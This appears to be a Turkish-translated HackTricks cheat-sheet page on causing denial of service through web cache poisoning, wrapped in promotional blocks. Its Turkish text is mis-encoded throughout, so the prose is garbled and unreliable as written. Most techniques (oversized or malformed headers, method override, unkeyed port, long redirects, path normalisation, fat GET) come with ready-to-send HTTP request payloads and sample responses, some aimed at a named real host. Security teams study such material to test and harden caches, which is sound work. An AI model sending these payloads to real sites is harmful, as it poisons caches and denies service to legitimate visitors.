# Ã–nbellek Zehirlenmesi ile DoS

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni (https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'in (https://opensea.io/collection/the-peass-family) bulunduÄŸu koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

{% hint style="danger" %}
Bu sayfada, **web sunucunun Ã¶nbellek sunucularÄ± iÃ§in geÃ§erli olan isteklere hatalarla yanÄ±t vermesini denemek iÃ§in farklÄ± varyasyonlar** bulabilirsiniz.
{% endhint %}

* **HTTP BaÅŸlÄ±k Boyutu AÅŸÄ±mÄ± (HHO)**

Web sunucunun desteklediÄŸinden daha bÃ¼yÃ¼k ancak Ã¶nbellek sunucusunun desteklediÄŸinden daha kÃ¼Ã§Ã¼k bir baÅŸlÄ±k boyutu ile bir istek gÃ¶nderin. Web sunucusu, Ã¶nbelleÄŸe alÄ±nabilecek bir 400 yanÄ±tÄ± ile yanÄ±t verecektir:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Karakteri (HMC) ve Beklenmeyen DeÄŸerler**

Bir `\n` ve `\r` gibi **zararlÄ± meta karakterler** iÃ§eren bir baÅŸlÄ±k gÃ¶nderin. SaldÄ±rÄ±nÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in Ã¶nce Ã¶nbelleÄŸi atlamalÄ±sÄ±nÄ±z.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Bir kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸ baÅŸlÄ±k sadece `\:` olabilir.

Bu ayrÄ±ca beklenmeyen deÄŸerler gÃ¶nderildiÄŸinde de Ã§alÄ±ÅŸabilir, Ã¶rneÄŸin beklenmeyen bir Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **AnahtarlÄ± olmayan baÅŸlÄ±k**

BazÄ± web siteleri, istekteki belirli baÅŸlÄ±klarÄ± gÃ¶rdÃ¼klerinde hata durum kodu dÃ¶ndÃ¼rebilirler, Ã¶rneÄŸin _X-Amz-Website-Location-Redirect: someThing_ baÅŸlÄ±ÄŸÄ± gibi:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP YÃ¶ntem GeÃ§ersiz KÄ±lma SaldÄ±rÄ±sÄ± (HMO)**

Sunucu, `X-HTTP-Method-Override`, `X-HTTP-Method` veya `X-Method-Override` gibi baÅŸlÄ±klarla HTTP yÃ¶ntemini deÄŸiÅŸtirme desteÄŸi saÄŸlÄ±yorsa, geÃ§erli bir sayfa istenerek yÃ¶ntem deÄŸiÅŸtirilebilir, bÃ¶ylece sunucu bunu desteklemediÄŸi iÃ§in kÃ¶tÃ¼ bir yanÄ±t Ã¶nbelleÄŸe alÄ±nabilir:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **AnahtarlanmamÄ±ÅŸ Port**

EÄŸer Host baÅŸlÄ±ÄŸÄ±ndaki port yanÄ±tta yansÄ±tÄ±lÄ±yor ve Ã¶nbellek anahtarÄ±nda bulunmuyorsa, kullanÄ±lmayan bir porta yÃ¶nlendirmek mÃ¼mkÃ¼ndÃ¼r:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Uzun YÃ¶nlendirme DoS**

AÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi, x Ã¶nbelleÄŸe alÄ±nmÄ±yor, bu yÃ¼zden bir saldÄ±rgan yÃ¶nlendirme yanÄ±t davranÄ±ÅŸÄ±nÄ± kÃ¶tÃ¼ye kullanarak yÃ¶nlendirmenin gÃ¶nderdiÄŸi URL'yi o kadar bÃ¼yÃ¼k yapabilir ki bir hata dÃ¶ndÃ¼rÃ¼r. Sonra, x anahtarÄ± Ã¶nbelleÄŸe alÄ±nmamÄ±ÅŸ olan URL'ye eriÅŸmeye Ã§alÄ±ÅŸan kiÅŸiler hata yanÄ±tÄ±nÄ± alacaklardÄ±r:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Ana baÅŸlÄ±k durum normalleÅŸtirme**

Ana baÅŸlÄ±k harf bÃ¼yÃ¼klÃ¼ÄŸÃ¼ne duyarsÄ±z olmalÄ±dÄ±r ancak bazÄ± web siteleri, kÃ¼Ã§Ã¼k harf olmasÄ±nÄ± bekler ve Ã¶yle olmadÄ±ÄŸÄ±nda hata dÃ¶ndÃ¼rÃ¼r:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Yol normalleÅŸtirme**

BazÄ± sayfalar, verileri URLencode olarak yollayarak hata kodlarÄ± dÃ¶ndÃ¼recektir, ancak Ã¶nbellek sunucusu yolun URLdecode edilmesini yapacak ve yanÄ±tÄ± URLdecode edilmiÅŸ yola saklayacaktÄ±r:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

BazÄ± Ã¶nbellek sunucularÄ±, Cloudflare gibi veya web sunucularÄ±, bir gÃ¶vde ile GET isteklerini durdurur, bu nedenle bu, geÃ§ersiz bir yanÄ±tÄ± Ã¶nbelleÄŸe almak iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referanslar

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n(https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini keÅŸfedin**](https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keÅŸfedin(https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
